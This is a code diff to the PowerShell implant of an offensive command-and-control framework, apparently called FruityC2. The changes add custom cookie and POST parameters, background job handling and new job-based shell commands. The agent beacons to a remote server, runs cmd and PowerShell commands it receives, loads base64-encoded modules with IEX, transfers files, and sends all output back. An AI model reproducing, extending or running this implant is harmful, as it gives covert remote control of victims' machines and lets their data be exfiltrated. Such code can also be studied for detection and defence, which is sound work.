@@ -5,6 +5,8 @@ function Invoke-FruityC2 {
         [String]$r_ssl = "",
         [String]$path_get = "",
         [String]$path_post = "",
+        [String]$post_id = "",
+        [String]$session_id = "SESSIONID",
         [Int]$stime = 10,
         [Int]$jitter = 0,
         [String]$UA = "",
@@ -19,6 +21,8 @@ function Invoke-FruityC2 {
     [String]$script:UA = $UA
     [String]$script:path_get = $path_get
     [String]$script:path_post = $path_post
+    [String]$script:post_id = $post_id
+    [String]$script:session_id = $session_id
     [String]$script:target = $target
 
     # DEBUG
@@ -29,6 +33,8 @@ function Invoke-FruityC2 {
     Write-Host "UA: $script:UA"
     Write-Host "GET: $script:path_get"
     Write-Host "POST: $script:path_post"
+    Write-Host "POST-ID: $script:post_id"
+    Write-Host "SESSION-ID: $script:session_id"
     Write-Host "target: $script:target"
     Write-Host "-------"
 
@@ -186,11 +192,12 @@ function Invoke-FruityC2 {
     function Get-Data {
         param($path = $script:path_get)
         try{
+            $SESSION_ID = $script:session_id
             $wc = new-object system.net.WebClient
             $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
             $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
             $wc.Headers.Add("User-Agent",$UA)
-            $wc.Headers.Add("Cookie", "SESSIONID=$TARGET;")
+            $wc.Headers.Add("Cookie", "$SESSION_ID=$TARGET;")
 
             $request = "http$($r_ssl)://$($r_server):$($r_port)$($path)"
 
@@ -208,21 +215,23 @@ function Invoke-FruityC2 {
     function Send-Data {
         param(
             $param, 
-            $path = $script:path_post
+            $path = $script:path_post,
+            $post_id = $script:post_id
             )
         try{
+            $SESSION_ID = $script:session_id
             $wc = new-object system.net.WebClient
             $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
             $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
             $wc.Headers.Add("User-Agent",$UA)
-            $wc.Headers.Add("Cookie", "SESSIONID=$TARGET;")
+            $wc.Headers.Add("Cookie", "$SESSION_ID=$TARGET;")
 
             $request = "http$($r_ssl)://$($r_server):$($r_port)$($path)"
 
             Write-Host $request
 
             $enc = [system.Text.Encoding]::UTF8
-            $send = $enc.GetBytes($param)
+            $send = $enc.GetBytes($post_id+"="+$param)
             $data = $wc.UploadData($request, "POST", $send);
             #$data = $wc.UploadString("http://"+$r_server+"/send", "POST", $send);
         }
@@ -247,6 +256,8 @@ function Invoke-FruityC2 {
         $script:UA = $temp[2]
         $script:path_get = $temp[3]
         $script:path_post = $temp[4]
+        $script:post_id = $temp[5]
+        $script:session_id = $temp[6]
     
     }
 
@@ -285,6 +296,61 @@ function Invoke-FruityC2 {
         }
     }
 
+    function Start-AgentJob {
+        param($data)
+
+        $JobName = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
+        $job = Start-Job -Name "job_$JobName" -Scriptblock ([scriptblock]::Create($data))
+        return $job.Name
+    }
+
+    function List-AgentJob() {
+        
+        $output = Get-Job
+
+        echo $output # DEBUG
+
+        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
+        #Send-Data -param "send=$output"
+        Send-Data -param "$output"
+    }
+
+    function Get-AgentJob() {
+        foreach ($x in Get-Job) {
+    
+            if ($x.State -eq "Completed") {
+                $job_name =  $x.Name
+
+                $data = Receive-Job -name $job_name
+                $output = $data | Out-String
+
+                #$output = execShellCommand($exec_command)
+
+                echo $output # DEBUG
+
+                $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
+                #Send-Data -param "send=$output"
+                Send-Data -param "$output"
+
+                stop-Job -Name $job_name
+                Remove-Job -Name $job_name
+
+                echo "----------"
+            
+            } ElseIf ($x.State -eq "Failed") {
+                $job_name =  $x.Name
+
+                $output = tx_data("Job Failed =(") # ENCRYPT/ENCODE DATA TO TRANSFER
+                #Send-Data -param "send=$output"
+                Send-Data -param "$output"
+
+                stop-Job -Name $job_name
+                Remove-Job -Name $job_name
+
+            }
+        }
+    }
+
     # DEBUG
     if ($stager -eq $true) { stager }
     Write-Host "[PROFILE]"
@@ -294,6 +360,8 @@ function Invoke-FruityC2 {
     Write-Host "UA: $script:UA"
     Write-Host "GET: $script:path_get"
     Write-Host "POST: $script:path_post"
+    Write-Host "POST-ID: $script:post_id"
+    Write-Host "SESSION-ID: $script:session_id"
     Write-Host "-------"
 
     $timeout = new-timespan -Minutes 10
@@ -319,39 +387,40 @@ function Invoke-FruityC2 {
         {
             #[String]$data = $WebClient.DownloadString($WebObject)
             [String]$data = Get-Data
+            if ($data -ne "") { 
 
-            [String]$data = rx_data($data) # DECODE/DECRYPT RECEIVED DATA
+                [String]$data = rx_data($data) # DECODE/DECRYPT RECEIVED DATA
         
-            [Array[]]$temp = $data.split("|")
-            [String]$exec_command = $temp[0]
-            [Int]$exec_flag = [convert]::ToInt32($temp[1], 10)
-            $exec_data = ""
-            $exec_import = ""
-            try {
-                [String]$exec_data = $temp[2]
-            } catch {
-                $exec_data = ""    
-            }
-            try {
-                [String]$exec_import = $temp[3]
-            } catch {
-                $exec_import = ""    
-            }
-
-            if ($flag -lt $exec_flag)
-            {
-                # RESET TIMEOUT
-                $sw = [diagnostics.stopwatch]::StartNew()
-
-                $flag = "$exec_flag"
-
-                if ($data -eq "EXIT"){
-                    write-host "Connection Closed..."
-                    return
+                [Array[]]$temp = $data.split("|")
+                [String]$exec_command = $temp[0]
+                [Int]$exec_flag = [convert]::ToInt32($temp[1], 10)
+                $exec_data = ""
+                $exec_import = ""
+                try {
+                    [String]$exec_data = $temp[2]
+                } catch {
+                    $exec_data = ""    
+                }
+                try {
+                    [String]$exec_import = $temp[3]
+                } catch {
+                    $exec_import = ""    
                 }
 
-                # CHANGE BECON SLEEP TIME
-                ElseIf ($exec_command.StartsWith("sleep")){
+                if ($flag -lt $exec_flag)
+                {
+                    # RESET TIMEOUT
+                    $sw = [diagnostics.stopwatch]::StartNew()
+
+                    $flag = "$exec_flag"
+
+                    if ($data -eq "EXIT"){
+                        write-host "Connection Closed..."
+                        return
+                    }
+
+                    # CHANGE BECON SLEEP TIME
+                    ElseIf ($exec_command.StartsWith("sleep")){
                         [Array[]]$temp = $exec_command.split(" ")
                         [String]$exec_command = $temp[0]
                         [Int]$beacon_sleep = [convert]::ToInt32($temp[1], 10)
@@ -359,10 +428,10 @@ function Invoke-FruityC2 {
                         $script:stime = $beacon_sleep
                         echo $script:stime
                         #return
-                }
+                    }
 
-                # DOWNLOAD A FILE FROM C2
-                ElseIf ($exec_command.StartsWith("upload")){
+                    # DOWNLOAD A FILE FROM C2
+                    ElseIf ($exec_command.StartsWith("upload")){
                         $exec_data = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($exec_data))
                         $upload_name = $exec_command.split(" ")[1]
 
@@ -376,13 +445,14 @@ function Invoke-FruityC2 {
                         echo $output # DEBUG
 
                         $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
-                        Send-Data -param "send=$output"
+                        #Send-Data -param "send=$output"
+                        Send-Data -param "$output"
 
                         echo  "upload done..." # DEBUG
-                }
+                    }
 
-                # UPLOAD A FILE TO C2
-                ElseIf ($exec_command.StartsWith("download")){
+                    # UPLOAD A FILE TO C2
+                    ElseIf ($exec_command.StartsWith("download")){
                         $exec_command
                         $upload_file = $exec_command.split(" ")[1]
 
@@ -397,32 +467,45 @@ function Invoke-FruityC2 {
 
                         $output = $output.Trim()
                         $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
-                        Send-Data -param "send=$output"
+                        #Send-Data -param "send=$output"
+                        Send-Data -param "$output"
 
                         echo  "download done..." # DEBUG
-                }
+                    }
 
-                # IMPORT POWERSHELL MODULE
-                ElseIf ($exec_command -eq "powershell-import"){
+                    # IMPORT POWERSHELL MODULE
+                    ElseIf ($exec_command -eq "powershell-import"){
                         $exec_data = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($exec_data))
                         IEX $exec_data
 
                         echo "powershell-import..."
-                }
+                    }
 
-                # EXEC POWERSHELL COMMAND
-                ElseIf ($exec_command.StartsWith("powershell ")){
+                    # EXEC POWERSHELL COMMAND
+                    ElseIf ($exec_command.StartsWith("powershell ")){
                         $exec_command = $exec_command -replace "^powershell ",""
+
                         $output = execPowershellCommand($exec_command)
                     
                         echo $output # DEBUG
 
                         $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
-                        Send-Data -param "send=$output"
-                }
+                        #Send-Data -param "send=$output"
+                        Send-Data -param "$output"
+                    }
 
-                # DOWNLOAD AND EXEC POWERSHELL SCRIPT
-                ElseIf ($exec_command -eq "powershell-runscript"){
+                    # EXEC POWERSHELL COMMAND [JOB]
+                    ElseIf ($exec_command.StartsWith("powershell_job ")){
+                        $exec_command = $exec_command -replace "^powershell_job ",""
+
+                        $job_name = Start-AgentJob -data $exec_command
+                        $output = tx_data("Job Started [powershell]: $job_name") # ENCRYPT/ENCODE DATA TO TRANSFER
+                        #Send-Data -param "send=$output"
+                        Send-Data -param "$output"
+                    }
+
+                    # DOWNLOAD AND EXEC POWERSHELL SCRIPT
+                    ElseIf ($exec_command -eq "powershell-runscript"){
                         $exec_command = $exec_command.Replace("powershell-runscript", "")
                         $exec_data = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($exec_data))
                         $output = execPowershellCommand($exec_data)
@@ -430,17 +513,17 @@ function Invoke-FruityC2 {
                         echo $output # DEBUG
 
                         $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
-                        Send-Data -param "send=$output"
-                }
+                        #Send-Data -param "send=$output"
+                        Send-Data -param "$output"
+                    }
 
-                ElseIf ($exec_command.StartsWith("powershell-encoded")){
+                    ElseIf ($exec_command.StartsWith("powershell-encoded")){
                         echo "COMMAND: powershell-encoded"
+                        <#
                         $exec_command = $exec_command.Replace("powershell-encoded ", "")
                         # IMPORT MODULE IF NOT EMPTY
-                        echo "[IMPORT]"
                         if ($exec_import -ne "") { IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($exec_import))) }
                         # DECODE AND EXEC COMAND
-                        echo "[EXEC]"
                         $exec_data = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($exec_data)) # ENCODED
                         #$exec_data = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($exec_data)) # BASE64
                         $output = execPowershellCommand($exec_data)
@@ -449,78 +532,127 @@ function Invoke-FruityC2 {
 
                         $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                         Send-Data -param "send=$output"
-                }
+                        #>
 
-                # PRINT CURRENT DIRECTORY
-                ElseIf ($exec_command -eq ("pwd")){
+                        # DECODE AND EXEC COMAND
+                        $exec_data = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($exec_data)) # ENCODED
+                        if ($exec_import -ne "") {
+                            $job_name = Start-AgentJob -data ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($exec_import)) + " ; $exec_data ")
+                        } else {
+                            $job_name = Start-AgentJob -data ($exec_data)
+                        }
+
+                        $output = tx_data("Job Started [encoded]: $job_name") # ENCRYPT/ENCODE DATA TO TRANSFER
+                        #Send-Data -param "send=$output"
+                        Send-Data -param "$output"
+
+                    }
+
+                    # PRINT CURRENT DIRECTORY
+                    ElseIf ($exec_command -eq ("pwd")){
                         $output = execPowershellCommand("pwd")
                         echo $output # DEBUG
 
                         $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
-                        Send-Data -param "send=$output"
-                }
+                        #Send-Data -param "send=$output"
+                        Send-Data -param "$output"
+                    }
 
-                # LIST FILES
-                ElseIf ($exec_command -eq ("ls")){
+                    # LIST FILES
+                    ElseIf ($exec_command -eq ("ls")){
                         $output = execPowershellCommand("ls")
                         echo $output # DEBUG
 
                         $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
-                        Send-Data -param "send=$output"
-                }
+                        #Send-Data -param "send=$output"
+                        Send-Data -param "$output"
+                    }
 
-                # CHANGE CURRENT PATH
-                ElseIf ($exec_command.StartsWith("cd ")){
+                    # CHANGE CURRENT PATH
+                    ElseIf ($exec_command.StartsWith("cd ")){
                         $output = execPowershellCommand($exec_command)
                         $output = execPowershellCommand("pwd")
 
                         echo $output # DEBUG
 
                         $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
-                        Send-Data -param "send=$output"
-                }
+                        #Send-Data -param "send=$output"
+                        Send-Data -param "$output"
+                    }
 
-                # EXEC CMD COMMAND
-                ElseIf ($exec_command.StartsWith("shell ")){
+                    # EXEC CMD COMMAND
+                    ElseIf ($exec_command.StartsWith("shell ")){
                         $exec_command = $exec_command -replace "^shell ",""
+                        
                         $output = execShellCommand($exec_command)
 
                         echo $output # DEBUG
 
                         $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
-                        Send-Data -param "send=$output"
-                }
+                        #Send-Data -param "send=$output"
+                        Send-Data -param "$output"
+                    }
 
-                # EXIT 
-                ElseIf ($exec_command -eq ("exit")){
-                    echo "EXIT..."
-                    break
-                }
+                    # EXEC CMD COMMAND [JOB]
+                    ElseIf ($exec_command.StartsWith("shell_job ")){
+                        $exec_command = $exec_command -replace "^shell_job ",""
+                        
+                        $job_name = Start-AgentJob -data $exec_command
+                        $output = tx_data("Job Started [shell]: $job_name") # ENCRYPT/ENCODE DATA TO TRANSFER
+                        #Send-Data -param "send=$output"
+                        Send-Data -param "$output"
+                    }
 
-                ElseIf ($exec_command -eq ("checkin")){
-                    echo "I'm alive ;)" # DEBUG
-                    $output = "ok"
+                    # EXIT 
+                    ElseIf ($exec_command -eq ("exit")){
+                        echo "EXIT..."
+                        break
+                    }
 
-                    $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
-                    Send-Data -param "send=$output"
-                }
+                    ElseIf ($exec_command -eq ("checkin")){
+                        echo "I'm alive ;)" # DEBUG
+                        $output = "ok"
 
-                Else {
-                    echo "exec command..."
+                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
+                        #Send-Data -param "send=$output"
+                        Send-Data -param "$output"
+                    }
+
+                    ElseIf ($exec_command -eq ("jobs")){
+                    
+                        $output = Get-Job
+
+                        echo $output # DEBUG
+
+                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
+                        #Send-Data -param "send=$output"
+                        Send-Data -param "$output"
+                    }
+
+                    Else {
+                        $output = "I don't know what to do with this command =\"
+                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
+                        #Send-Data -param "send=$output"
+                        Send-Data -param "$output"
+                        echo $output
+                    }
                 }
+                #echo $data
+                #execCommand($data)
             }
-            #echo $data
-            #execCommand($data)
-        } 
+        }
         catch 
         {
-            #echo "[BOT ERROR] $Error[0]"
+            #echo "[AGENT ERROR] $Error[0]"
             #Throw "$($Error[0].Exception.InnerException.InnerException.Message)"
-            echo "[BOT ERROR]"
+            echo "[AGENT ERROR]"
         }
+
+        Get-AgentJob
+
         $sleepTime = getBeaconTime # GET SLEEP TIME AND JITTER
         start-sleep -seconds $sleepTime
     }
-    echo "Bye Bye PS-BOT ;)"
+    echo "Bye Bye ;)"
 }
 #Invoke-FruityC2 -r_server "x.x.x.x" -r_port "xx"
